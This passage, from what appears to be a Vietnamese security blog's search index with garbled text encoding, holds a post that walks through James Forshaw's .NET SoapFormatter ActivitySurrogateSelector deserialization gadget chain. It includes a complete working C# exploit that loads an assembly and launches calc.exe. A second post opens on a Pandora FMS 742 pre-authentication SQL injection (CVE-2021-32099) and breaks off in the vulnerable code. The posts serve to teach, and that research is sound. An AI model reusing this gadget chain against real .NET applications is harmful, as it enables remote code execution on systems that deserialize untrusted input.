implement thÃ´ng qua Ä‘oáº¡n code sau, trong Ä‘Ã³, object e2 cÃ³ type lÃ  IEnumerable\n1 2 Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt; map_type = (Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt;)Delegate.CreateDelegate(typeof(Func\u0026lt;Assembly,IEnumerable\u0026lt;Type\u0026gt;\u0026gt;),typeof(Assembly).GetMethod(\u0026#34;GetTypes\u0026#34;)); var e2 = e1.SelectMany(map_type); BÆ°á»›c 3: Type[] -\u0026gt; Activator.CreateInstance(Type[]) -\u0026gt; object[] Ä‘Æ°á»£c hiá»‡n hiá»‡n thá»±c nhÆ° sau, trong Ä‘Ã³ e3 cÃ³ type lÃ  IEnumerable\n1 var e3 = e2.Select(Activator.CreateInstance); Do Ä‘Ã³, chain cá»§a James Forshaw Ä‘Æ°á»£c hiá»‡n thá»±c bá»Ÿi Ä‘oáº¡n code nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 using System; using System.Collections.Generic; using System.IO; using System.Linq; using System.Reflection; namespace LinqBasic { internal class Program { public static void Main(string[] args) { // step 1 List\u0026lt;byte[]\u0026gt; data = new List\u0026lt;byte[]\u0026gt;(); data.Add(File.ReadAllBytes(typeof(ExploitClass).Assembly.Location)); var e1 = data.Select(Assembly.Load); // step2 Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt; map_type = (Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt;)Delegate.CreateDelegate(typeof(Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt;), typeof(Assembly).GetMethod(\u0026#34;GetTypes\u0026#34;)); var e2 = e1.SelectMany(map_type); // step3 var e3 = e2.Select(Activator.CreateInstance); } } } NgoÃ i ra, ExploitClass táº¡i dÃ²ng 17 sáº½ Ä‘Æ°á»£c implemnt Ä‘Æ¡n giáº£n nhÆ° sau\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 using System; namespace LinqBasic { internal class ExploitClass { public ExploitClass() { try { // Payload code to be executed System.Diagnostics.Process.Start(\u0026#34;calc.exe\u0026#34;); } catch (Exception) { } } } } Perfect, cháº¡y thÃ´i!!!!\ná»¦a alo!!!! Calculator Ä‘Ã¢u?? Sau má»™t há»“i suy nghÄ© tÃ´i chá»£t nhá»›!\nLINQ cÃ³ tÃ­nh cháº¥t delay execution!\nNghÄ©a lÃ  khi nÃ o Ä‘Æ°á»£c sá»­ dá»¥ng nÃ³ má»›i thá»±c thi. CÃ³ khi á»Ÿ bÆ°á»›c nÃ y, LINQ chÆ°a Ä‘Æ°á»£c sá»­ dá»¥ng. Táº¡m thá»i cho lÃ  váº­y vÃ  Ä‘i tiáº¿p thÃ´i\n2. Fom ToString to IEnumerable Náº¿u cÃ¡c báº¡n Ä‘Ã£ Ä‘i qua PHP-deserialize thÃ¬ __tostring() lÃ  má»™t trong nhá»¯ng magic method thÃ´ng dá»¥ng (sau __wakeup(), __destruct()) Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ khai thÃ¡c lá»— há»•ng php deserialize. Vá»›i chain nÃ y trong .Net, James Forshaw cÅ©ng láº¥y Ã½ tÆ°á»Ÿng nhÆ° váº­y:\nTÃ¬m cÃ¡ch trigger ToString() khi deserialize TÃ¬m chain tá»« ToString() gá»i Ä‘áº¿n IEnumerable CÃ¹ng xem xÃ©t Ä‘oáº¡n code sau:\n1 2 3 4 5 6 7 8 9 10 11 12 // PagedDataSource maps an arbitrary IEnumerable to an ICollection PagedDataSource pds = new PagedDataSource() { DataSource = e3 }; // AggregateDictionary maps an arbitrary ICollection to an IDictionary // Class is internal so need to use reflection. IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType(\u0026#34;System.Runtime.Remoting.Channels.AggregateDictionary\u0026#34;), pds); // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked. DesignerVerb verb = new DesignerVerb(\u0026#34;XYZ\u0026#34;, null); // Need to insert IDictionary using reflection. typeof(MenuCommand).GetField(\u0026#34;properties\u0026#34;, BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict); Trong Ä‘oáº¡n code trÃªn, e3 cÃ³ kiá»ƒu lÃ  IEnumerable (biáº¿n á»Ÿ Ä‘oáº¡n code vÃ­ dá»¥ á»Ÿ pháº§n V.1) vÃ  má»¥c Ä‘Ã­ch cá»§a Ä‘oáº¡n code nÃ y lÃ  dÃ¹ng reflection Ä‘á»ƒ set giÃ¡ trá»‹ verb.properties=dict Táº¡i sao láº¡i nhÆ° váº­y nhá»‰???\nÄáº§u tiÃªn, ta Ä‘i xem sÆ¡ qua cáº¥u trÃºc cá»§a cÃ¡c kiá»ƒu dá»¯ kiá»‡u trong Ä‘oáº¡n code trÃªn\nPageDataSource IDictionary DesignerWeb káº¿ thá»«a MenuCommand Trong MenuCommand thÃ¬ chÃº Ã½ tá»›i dÃ²ng 17 Tá»« nhá»¯ng dá»¯ kiá»‡n trÃªn, tÃ´i Ä‘Æ¡n giáº£n thÃ nh Ä‘oáº¡n code nhÆ° sau: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 public class MenuCommand { private IDictionary properties; // ...other members and methods... } public class DesignerVerb : MenuCommand { private string name; // ...other members and methods... public DesignerVerb(string name, IDictionary properties) { this.name = name; this.properties = properties; } public override string ToString() { // ...implementation... } } vÃ  nhÃ¬n láº¡i Ä‘oáº¡n code mÃ  chÃºng ta cáº§n phÃ¢n tÃ­ch\n1 2 3 4 PagedDataSource pds = new PagedDataSource() { DataSource = e3 }; IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType(\u0026#34;System.Runtime.Remoting.Channels.AggregateDictionary\u0026#34;), pds); DesignerVerb verb = new DesignerVerb(\u0026#34;XYZ\u0026#34;, null); typeof(MenuCommand).GetField(\u0026#34;properties\u0026#34;, BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict); DÃ²ng 1 Ä‘Æ¡n giáº£n lÃ  táº¡o 1 instance PagedDataSource vá»›i DataSource = e3 (e3 lÃ  LINQ á»Ÿ pháº§n V.1)\nDÃ²ng 2 táº¡o 1 instance cá»§a AggregateDictionary (lÃ  má»™t IDictionary), sá»­ dá»¥ng reflection vÃ  gÃ¡n vÃ o dict vÃ  dÃ¹ng biáº¿n pds á»Ÿ dÃ²ng 1 lÃ m tham sá»‘ cÃ³ constructor.\nDÃ²ng 3: táº¡o má»™t DesignerVerb cÃ³ tÃªn lÃ  â€œXYZâ€ vÃ  khÃ´ng gÃ¡n giÃ¡ trá»‹ cho properties\nDÃ²ng 4: dÃ¹ng reflection truy cáº­p tá»›i private field properties cá»§a class MenuCommand. Sau Ä‘Ã³, gÃ¡n giÃ¡ trá»‹ properties cá»§a verb lÃ  dict.\nLÆ°u Ã½:\nverb lÃ  instance cá»§a DesignerVerb DesignerVerb káº¿ thá»«a properties tá»« MenuCommand properties lÃ  1 private trong MenuCommand â‡’ dÃ¹ng reflection truy cáº­p vÃ o properties cá»§a MenuCommand nhÆ°ng set value thÃ¬ cá»§a verb.\nÄá»ƒ gá»i ToString() method thÃ¬ chá»‰ cáº§n dÃ¹ng verb.ToString()\nOke, cháº¡y thá»­ thÃ´i\nGÃ²i gÃ²i Ä‘Ã¢y gÃ²i!! Ca cu lay tá» cá»§a tui Ä‘Ã¢y rá»“i.!!\nCÃ³ nghÄ©a Ä‘áº¿n Ä‘Ã¢y, ToString() Ä‘Ã£ trigger LINQ, ExploitClass Ä‘Æ°á»£c thá»±c thi vÃ  calc Ä‘Ã£ Ä‘Æ°á»£c báº­t. Äi tiáº¿p thÃ´i.\n3. HashTable to ToString ChÃºng ta Ä‘Ã£ thÃ nh cÃ´ng tá»« viá»‡c dÃ¹ng ToString() Ä‘á»ƒ trigger LINQ, execute malicious code Ä‘á»ƒ popup calc Pháº§n nÃ y chÃºng ta sáº½ giáº£i quyáº¿t váº¥n Ä‘á» cÃ²n láº¡i: LÃ m sao Ä‘á»ƒ trigger ToString() trong quÃ¡ trÃ¬nh deserialize (verb.ToString() á»Ÿ cuá»‘i pháº§n trÆ°á»›c chá»‰ lÃ  dÃ¹ng Ä‘á»ƒ chá»©ng mÃ¬nh ta thÃ nh cÃ´ng trong viá»‡c ToString() Ä‘áº¿n execute calc). VÃ  solution á»Ÿ Ä‘Ã¢y lÃ  dÃ¹ng HashTable FUN: Tháº¥y HashTable lÃ m tÃ´i nghÄ© ngay tá»›i cÃ¡c commonsCollection trong Java Deserialize, HashTable cÅ©ng Ä‘Æ°á»£c dÃ¹ng trong cc7\nHÃ£y xem HashTable cÃ³ gÃ¬?\nTrong HashTable cÃ³ má»™t method public virtual void OnDeserialization(object sender);DÃ¹ng dnspy Ä‘á»ƒ xem\nTrong quÃ¡ trÃ¬nh Deserialize, HashTable sáº½ rebuild láº¡i táº­p key vÃ  insert.\nTrong Insert(), náº¿u nhÆ° key bá»‹ duplicated, chÆ°Æ¡ng trÃ¬nh deserialize fail, quÄƒng ra lá»—i\nBlock_12:\nVÃ  Environment.GetResourceString() Ä‘Æ°á»£c gá»i\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 List\u0026lt;object\u0026gt; ls = new List\u0026lt;object\u0026gt;(); ls.Add(e1); ls.Add(e2); ls.Add(e3); ls.Add(pds); ls.Add(verb); ls.Add(dict); Hashtable ht = new Hashtable(); ht.Add(verb, \u0026#34;\u0026#34;); ht.Add(\u0026#34;\u0026#34;, \u0026#34;\u0026#34;); FieldInfo fi_keys = ht.GetType().GetField(\u0026#34;buckets\u0026#34;, BindingFlags.NonPublic | BindingFlags.Instance); Array keys = (Array)fi_keys.GetValue(ht); FieldInfo fi_key = keys.GetType().GetElementType().GetField(\u0026#34;key\u0026#34;, BindingFlags.Public | BindingFlags.Instance); for (int i = 0; i \u0026lt; keys.Length; ++i) { object bucket = keys.GetValue(i); object key = fi_key.GetValue(bucket); if (key is string) { fi_key.SetValue(bucket, verb); keys.SetValue(bucket, i); break; } } fi_keys.SetValue(ht, keys); ls.Add(ht); Äoáº¡n code trÃªn dÃ¹ng reflection Ä‘á»ƒ sá»­a giÃ¡ trá»‹ cá»§a buckets field vÃ  replace the key lÃ  string vá»›i verb Ä‘á»ƒ 2 key trÃ¹ng nhau â‡’ hash trÃ¹ng nhau â‡’ lá»—i sáº½ trigger â‡’ trigger ToString nhÆ° phÃ¢n tÃ­ch á»Ÿ trÃªn.\n4. System.Windows.Forms.AxHost.State handling á» pháº§n trÆ°á»›c ta tháº¥y má»i thá»© cÃ³ váº» hoÃ n háº£o:\nChÃºng ta Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c cÃ¡ch trigger ToString() trong quÃ¡ trÃ¬nh deserialize TÃ¬m Ä‘Æ°á»£c chain tá»« ToString() trigger Linq Tá»« LINQ trigger malicious code. BÃ¢y giá» káº¿t há»£p má»i thá»© láº¡i vÃ  cháº¡y kiá»ƒm tra\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 using System; using System.Collections; using System.Collections.Generic; using System.ComponentModel.Design; using System.Data; using System.IO; using System.Linq; using System.Reflection; using System.Runtime.Serialization; using System.Runtime.Serialization.Formatters.Binary; using System.Runtime.Serialization.Formatters.Soap; using System.Web.UI.WebControls; namespace LinqBasic { class MySurrogateSelector : SurrogateSelector { public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector) { selector = this; if (!type.IsSerializable) { Type t = Type.GetType(\u0026#34;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\u0026#34;); return (ISerializationSurrogate)Activator.CreateInstance(t); } return base.GetSurrogate(type, context, out selector); } } [Serializable] public class PayloadClass : ISerializable { public byte[] GadgetChains() { System.Diagnostics.Trace.WriteLine(\u0026#34;In GetObjectData\u0026#34;); // Build a chain to map a byte array to creating an instance of a class. // byte[] -\u0026gt; Assembly.Load -\u0026gt; Assembly -\u0026gt; Assembly.GetType -\u0026gt; Type[] -\u0026gt; Activator.CreateInstance -\u0026gt; Win! // step 1 List\u0026lt;byte[]\u0026gt; data = new List\u0026lt;byte[]\u0026gt;(); data.Add(File.ReadAllBytes(typeof(ExploitClass).Assembly.Location)); var e1 = data.Select(Assembly.Load); // step 2 Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt; map_type = (Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt;)Delegate.CreateDelegate(typeof(Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt;), typeof(Assembly).GetMethod(\u0026#34;GetTypes\u0026#34;)); var e2 = e1.SelectMany(map_type); // step 3 var e3 = e2.Select(Activator.CreateInstance); // PagedDataSource maps an arbitrary IEnumerable to an ICollection PagedDataSource pds = new PagedDataSource() { DataSource = e3 }; // AggregateDictionary maps an arbitrary ICollection to an IDictionary // Class is internal so need to use reflection. IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType(\u0026#34;System.Runtime.Remoting.Channels.AggregateDictionary\u0026#34;), pds); // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked. DesignerVerb verb = new DesignerVerb(\u0026#34;XYZ\u0026#34;, null); // Need to insert IDictionary using reflection. typeof(MenuCommand).GetField(\u0026#34;properties\u0026#34;, BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict); // Pre-load objects, this ensures they\u0026#39;re fixed up before building the hash table. List\u0026lt;object\u0026gt; ls = new List\u0026lt;object\u0026gt;(); ls.Add(e1); ls.Add(e2); ls.Add(e3); ls.Add(pds); ls.Add(verb); ls.Add(dict); Hashtable ht = new Hashtable(); // Add two entries to table. ht.Add(verb, \u0026#34;Hello\u0026#34;); ht.Add(\u0026#34;Dummy\u0026#34;, \u0026#34;Hello2\u0026#34;); // reflection to change buckets FieldInfo fi_keys = ht.GetType().GetField(\u0026#34;buckets\u0026#34;, BindingFlags.NonPublic | BindingFlags.Instance); Array keys = (Array)fi_keys.GetValue(ht); FieldInfo fi_key = keys.GetType().GetElementType().GetField(\u0026#34;key\u0026#34;, BindingFlags.Public | BindingFlags.Instance); for (int i = 0; i \u0026lt; keys.Length; ++i) { object bucket = keys.GetValue(i); object key = fi_key.GetValue(bucket); if (key is string) { fi_key.SetValue(bucket, verb); keys.SetValue(bucket, i); break; } } fi_keys.SetValue(ht, keys); ls.Add(ht); BinaryFormatter fmt1 = new BinaryFormatter(); MemoryStream stm = new MemoryStream(); fmt1.SurrogateSelector = new MySurrogateSelector(); fmt1.Serialize(stm, ls); return stm.ToArray(); } public void GetObjectData(SerializationInfo info, StreamingContext context) { System.Diagnostics.Trace.WriteLine(\u0026#34;In GetObjectData\u0026#34;); //info.SetType(typeof(System.Windows.Forms.AxHost.State)); //info.AddValue(\u0026#34;PropertyBagBinary\u0026#34;, GadgetChains()); } } class Program { static void Main(string[] args) { System.Configuration.ConfigurationManager.AppSettings.Set(\u0026#34;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck\u0026#34;, \u0026#34;true\u0026#34;); SoapFormatter fmt1 = new SoapFormatter(); SoapFormatter fmt2 = new SoapFormatter(); MemoryStream stm = new MemoryStream(); PayloadClass test = new PayloadClass(); fmt1.SurrogateSelector = new MySurrogateSelector(); //fmt1.Serialize(stm, test.GadgetChains()); fmt1.Serialize(stm, test); stm.Seek(0, SeekOrigin.Begin); fmt2.Deserialize(stm); } } } Ã”i Khoan!! cÃ³ lá»—i á»Ÿ Ä‘Ã¢y.\nÄáº¿n thá»i Ä‘iá»ƒm nÃ y tÃ´i cÅ©ng khÃ´ng biáº¿t vÃ¬ sao. Tuy nhiÃªn, tÃ´i tháº¥y bá»™ cÃ´ng cá»¥ ná»•i tiáº¿ng ysoserial.net sá»­ dá»¥ng System.Windows.Forms.AxHost.State handling Ä‘á»ƒ xá»­ lÃ½ pháº§n lá»—i xáº£y ra á»Ÿ chain nÃ y\nCá»¥ thá»ƒ, khi thÃªm pháº§n handling cá»§a System.Windows.Forms.AxHost.State:\nKhi enumerator.Name = PropertyBagBinary, cÃ¢u lá»‡nh táº¡i dÃ²ng 7228 Ä‘Æ°á»£c thá»±c thi Äáº¿n Ä‘Ã¢y thÃ¬ stream sáº½ Ä‘Æ°á»£c deserialize. ÄÃ¢y cÅ©ng lÃ  endpoint cá»§a 1 chain khÃ¡c AxHostState attack chain NhÆ°ng nhÆ° tháº¿ thÃ¬ liÃªn quan gÃ¬ Ä‘áº¿n Ä‘oáº¡n code ban Ä‘áº§u cá»§a chÃºng ta? Táº¡i sao khÃ´ng thÃªm Ä‘oáº¡n nÃ y thÃ¬ láº¡i bá»‹ lá»—i? Äiá»u chÃºng ta cáº§n Ä‘Ã¢u pháº£i hÃ m Deserialize nÃ y vÃ¬ trong Ä‘oáº¡n code Ä‘Ã£ deserialize rá»“i mÃ ??\nTÃ´i quyáº¿t Ä‘á»‹nh dÃ¹ng DNSpy Ä‘á»ƒ decode.ChÆ°Æ¡ng trÃ¬nh Ä‘Ã£ vÃ o pháº§n xá»­ lÃ½ lá»—i khi deserialize Hashtable vÃ¬ duplicate.\nCá»© tiáº¿p tá»¥c vÃ  tháº¥y\noh, TÃ´i Ä‘Ã£ hiá»ƒu! CÃ¡c báº¡n cÃ²n nhá»› Ä‘á»ƒ trigger ToString() ta pháº£i lÃ m cho quÃ¡ trÃ¬nh deserialize cá»§a HashTable bá»‹ lá»—i, nháº£y vÃ o exception Ä‘á»ƒ trigger ToString() chá»©? Exception nÃ y lÃ  do nÃ³ tráº£ vá» trÆ°á»›c khi malicious cá»§a chÃºng ta execute nÃªn Ä‘Ã£ nháº­n thÃ´ng bÃ¡o lá»—i.\nDo Ä‘Ã³, ysoserial.net sá»­ dá»¥ng System.Windows.Forms.AxHost.State Ä‘á»ƒ xá»­ lÃ½ lá»—i nÃ y, cá»¥ thá»ƒ khi bá»‹ trigger lá»—i, hÃ m nÃ y sáº½ xá»­ lÃ½. Trong payload, ta set\nkhi Ä‘Ã³, this.proBag.Read() Ä‘Æ°á»£c gá»i vá»›i stream lÃ  payload cá»§a mÃ¬nh\nÄáº¿n Ä‘Ã¢y thÃ¬ payload sáº½ Ä‘Æ°á»£c deserialize 1 láº§n ná»¯a KhÃºc nÃ y khÃ¡ áº£o. Theo nhÆ° tÃ´i hiá»ƒu, láº§n Ä‘áº§u deserialize thÃ¬ sáº½ bá»‹ lá»—i, chÃºng ta thÃªm System.Windows.Forms.AxHost.State Ä‘á»ƒ handle error nÃ y Khi handle error nÃ y, payload cá»§a chÃºng ta Ä‘Æ°á»£c deserialize 1 láº§n ná»¯a. MÃ  láº§n deserialize nÃ y do Ä‘Ã£ add handle exception trÆ°á»›c Ä‘Ã³ rá»“i, nÃªn error sáº½ khÃ´ng bá»‹ vÄƒng ra vÃ  malicious sáº½ Ä‘Æ°á»£c execute. Full exploit: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 using System; using System.Collections; using System.Collections.Generic; using System.ComponentModel.Design; using System.Data; using System.IO; using System.Linq; using System.Reflection; using System.Runtime.Serialization; using System.Runtime.Serialization.Formatters.Binary; using System.Runtime.Serialization.Formatters.Soap; using System.Web.UI.WebControls; namespace LinqBasic { class MySurrogateSelector : SurrogateSelector { public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector) { selector = this; if (!type.IsSerializable) { Type t = Type.GetType(\u0026#34;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\u0026#34;); return (ISerializationSurrogate)Activator.CreateInstance(t); } return base.GetSurrogate(type, context, out selector); } } [Serializable] public class PayloadClass : ISerializable { public byte[] GadgetChains() { System.Diagnostics.Trace.WriteLine(\u0026#34;In GetObjectData\u0026#34;); // Build a chain to map a byte array to creating an instance of a class. // byte[] -\u0026gt; Assembly.Load -\u0026gt; Assembly -\u0026gt; Assembly.GetType -\u0026gt; Type[] -\u0026gt; Activator.CreateInstance -\u0026gt; Win! // step 1 List\u0026lt;byte[]\u0026gt; data = new List\u0026lt;byte[]\u0026gt;(); data.Add(File.ReadAllBytes(typeof(ExploitClass).Assembly.Location)); var e1 = data.Select(Assembly.Load); // step 2 Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt; map_type = (Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt;)Delegate.CreateDelegate(typeof(Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt;), typeof(Assembly).GetMethod(\u0026#34;GetTypes\u0026#34;)); var e2 = e1.SelectMany(map_type); // step 3 var e3 = e2.Select(Activator.CreateInstance); // PagedDataSource maps an arbitrary IEnumerable to an ICollection PagedDataSource pds = new PagedDataSource() { DataSource = e3 }; // AggregateDictionary maps an arbitrary ICollection to an IDictionary // Class is internal so need to use reflection. IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType(\u0026#34;System.Runtime.Remoting.Channels.AggregateDictionary\u0026#34;), pds); // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked. DesignerVerb verb = new DesignerVerb(\u0026#34;XYZ\u0026#34;, null); // Need to insert IDictionary using reflection. typeof(MenuCommand).GetField(\u0026#34;properties\u0026#34;, BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict); // Pre-load objects, this ensures they\u0026#39;re fixed up before building the hash table. List\u0026lt;object\u0026gt; ls = new List\u0026lt;object\u0026gt;(); ls.Add(e1); ls.Add(e2); ls.Add(e3); ls.Add(pds); ls.Add(verb); ls.Add(dict); Hashtable ht = new Hashtable(); // Add two entries to table. ht.Add(verb, \u0026#34;Hello\u0026#34;); ht.Add(\u0026#34;Dummy\u0026#34;, \u0026#34;Hello2\u0026#34;); // reflection to change buckets FieldInfo fi_keys = ht.GetType().GetField(\u0026#34;buckets\u0026#34;, BindingFlags.NonPublic | BindingFlags.Instance); Array keys = (Array)fi_keys.GetValue(ht); FieldInfo fi_key = keys.GetType().GetElementType().GetField(\u0026#34;key\u0026#34;, BindingFlags.Public | BindingFlags.Instance); for (int i = 0; i \u0026lt; keys.Length; ++i) { object bucket = keys.GetValue(i); object key = fi_key.GetValue(bucket); if (key is string) { fi_key.SetValue(bucket, verb); keys.SetValue(bucket, i); break; } } fi_keys.SetValue(ht, keys); ls.Add(ht); BinaryFormatter fmt1 = new BinaryFormatter(); MemoryStream stm = new MemoryStream(); fmt1.SurrogateSelector = new MySurrogateSelector(); fmt1.Serialize(stm, ls); return stm.ToArray(); } public void GetObjectData(SerializationInfo info, StreamingContext context) { System.Diagnostics.Trace.WriteLine(\u0026#34;In GetObjectData\u0026#34;); info.SetType(typeof(System.Windows.Forms.AxHost.State)); info.AddValue(\u0026#34;PropertyBagBinary\u0026#34;, GadgetChains()); } } class Program { static void Main(string[] args) { System.Configuration.ConfigurationManager.AppSettings.Set(\u0026#34;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck\u0026#34;, \u0026#34;true\u0026#34;); SoapFormatter fmt1 = new SoapFormatter(); SoapFormatter fmt2 = new SoapFormatter(); MemoryStream stm = new MemoryStream(); PayloadClass test = new PayloadClass(); fmt1.SurrogateSelector = new MySurrogateSelector(); //fmt1.Serialize(stm, test.GadgetChains()); fmt1.Serialize(stm, test); stm.Seek(0, SeekOrigin.Begin); fmt2.Deserialize(stm); } } } VI Tá»•ng káº¿t Váº­y lÃ  Ä‘i qua chain nÃ y rá»“i, tá»›i Ä‘Ã¢y vÃ  táº¡i thá»i Ä‘iá»ƒm nÃ y tÃ´i nghÄ© mÃ¬nh Ä‘Ã£ hiá»ƒu Ä‘Æ°á»£c 90-95% chain nÃ y. ÄÃ¢y lÃ  má»™t blog dÃ i, nhÆ°ng vá»›i 1 .Net deserialize 2 tuáº§n nhÆ° tÃ´i thÃ¬ qua blog nÃ y tÃ´i há»c Ä‘Æ°á»£c ráº¥t nhiá»u thá»©. VÃ  Ä‘Ã¢y lÃ  tá»•ng káº¿t flow cá»§a chain ActivitySurrogateSelector: Trigger lá»—i trong HashTable Ä‘á»ƒ execute vÃ o ToString\nTá»« ToString Ä‘áº¿n IEnumerable\n1 ToString -\u0026gt; DesignerVerb -\u0026gt; IDictionary -\u0026gt; AggregateDictionary -\u0026gt; ICollectionICollection -\u0026gt; PagedDataSource -\u0026gt; IEnumerable Tá»« IEnumerable Ä‘áº¿n LINQ exploit chain\n1 2 3 byte[] -\u0026gt; Assembly.Load(byte[]) -\u0026gt; Assembly Assembly -\u0026gt; Assembly.GetType() -\u0026gt; Type[] Type[] -\u0026gt; Activator.CreateInstance(Type[]) -\u0026gt; object[] LINQ exploit chain:\nSá»­ dá»¥ng ActivitySurrogateSelector+ObjectSurrogate Ä‘á»ƒ serialize nhá»¯ng class khÃ´ng thá»ƒ serialize, má»¥c tiÃªu táº¡i LINQ DÃ¹ng LINQ thay tháº¿ delegate cá»§a nÃ³ thÃ nh Assembly.Load Ä‘á»ƒ load malicious code vÃ  táº¡o 1 instance DÃ¹ng System.Windows.Forms.AxHost.State wrap Ä‘á»ƒ handle exception.\nVII Nguá»“n tham kháº£o .netååºåˆ—åŒ–ä¹‹SoapFormatter - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)\nSoapFormatterååºåˆ—åŒ–é“¾ActivitySurrogateSelector - zpchcbd - åšå®¢å›­ (cnblogs.com)\n.NET Deserialization 101. NhÆ° cÃ¡c báº¡n Ä‘Ã£ biáº¿t, cÃ¡c ngÃ´n ngá»¯ Ä‘iá»uâ€¦ | by hkln1 | tradahacking (medium0.com)\n","description":"Sau gáº§n má»™t thÃ¡ng há»c vá» JavaDeserialize: há»c cÃ¡c khÃ¡i niá»‡m basic, reproduce cÃ¡c commonscollection thÃ¬ láº§n nÃ y tÃ´i cÃ³ cÆ¡ há»™i tiáº¿p xÃºc vá»›i .Net deserialize\nCÅ©ng lÃ  há»c cÃ¡c kiáº¿n thá»©c basic vÃ  reproduce cÃ¡c chain kinh Ä‘iá»ƒn cá»§a .Net deserialize trÃªn [å…ˆçŸ¥ç¤¾åŒº (aliyun.com)](https://xz.aliyun.com/u/12258) ","id":4,"section":"posts","tags":["C#"],"title":"[.NET deserialize] SoapFormatter:ActivitySurrogateSelector","uri":"https://minhlongmt183.github.io/posts/dot_net_101_soapformatter_activitysurrogateselector/"},{"content":"From SQLi to PHP deserialize to RCE on Pandora FMS 742 Welcome to my blog, dedicated to unraveling the intricated world of PHP vulnerabilities! Today, Iâ€™m thrilled to share my latest research findings on Pandora FMS 742, a prominent network monitoring tool. In my pursuit of enhancing the security landscape, Iâ€™ve meticulously analyzed the critical code vulnerabilities inherent in this widely-used software.\nI Introducing Pandora FMS 742 Pandora FMS is a monitoring software that collects data from any system, generates alerts based on that data and shows graphs, reports and maps of our environment. There are two versions of Pandora FMS: a free or Open Source version and a paid or Enterprise version, available starting from 100 devices. II Building the environment To Install Pandora FMS, you can refer directly to Pandora FMS Documentation Installing [Pandora FMS Documentation] or follow the installation guide for Ubuntu from the following links:\nHow To Install Pandora FMS Monitoring Tool in Ubuntu 18.04 (tecmint.com) source: Pandora FMS: Flexible Monitoring System - Browse /Pandora FMS 7.0NG/742/Debian_Ubuntu at SourceForge.net III Exploitation 1. SQL Injection (pre authentication) (CVE-2021-32099) The vulnerability originates from the applicationâ€™s failure to validate the input values from users in the include/chart_generator.php: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ... $user = new PandoraFMS\\User([\u0026#39;phpsessionid\u0026#39; =\u0026gt; $_REQUEST[\u0026#39;session_id\u0026#39;]]); if (check_login(false) === false) { // Error handler. ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=utf-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Access denied\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;styles/pandora.css\u0026#34; type=\u0026#34;text/css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;styles/pandora_minimal.css\u0026#34; 